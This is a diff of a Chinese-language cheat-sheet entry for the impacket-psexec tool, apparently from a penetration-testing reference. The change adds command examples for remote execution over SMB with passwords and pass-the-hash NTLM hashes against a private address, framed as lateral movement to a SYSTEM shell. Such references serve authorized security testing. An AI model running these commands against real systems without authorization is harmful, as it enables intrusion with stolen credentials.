@@ -1,20 +1,32 @@
 # impacket-psexec
 
 ## 简介
-使用 SMB 协议远程执行命令，类似 Windows 的 PsExec
+通过 SMB 实现远程命令执行，获取 SYSTEM 权限
 
 ## 核心参数
-- `domain/user:password@target`: 使用密码连接
-- `-hashes :NTLM`: 使用 NTLM 哈希连接
+- 格式：domain/user:password@target
+- `-hashes`: 使用 NTLM 哈希
 
 ## 命令示例
 ```bash
-# 基本用法
-impacket-psexec [参数]
+# 使用密码连接
+impacket-psexec domain/admin:password@192.168.1.100
+
+# 本地用户连接
+impacket-psexec admin:password@192.168.1.100
+
+# Pass-the-Hash
+impacket-psexec domain/admin@192.168.1.100 -hashes :ntlm_hash
+
+# 执行单条命令
+impacket-psexec admin:password@192.168.1.100 'whoami'
+
+# 使用 LM:NTLM 哈希
+impacket-psexec admin@192.168.1.100 -hashes lm_hash:ntlm_hash
 ```
 
 ## 使用场景
-获取凭据后在内网中横向移动的首选工具
+横向移动时获取远程系统的 SYSTEM shell
 
 ## 所属分类
-- [横向移动 (Lateral Movement)](../categories/16-lateral-movement.md)
+- [Pass-the-Hash 攻击 (Pass-the-Hash)](../categories/13-pass-the-hash.md)
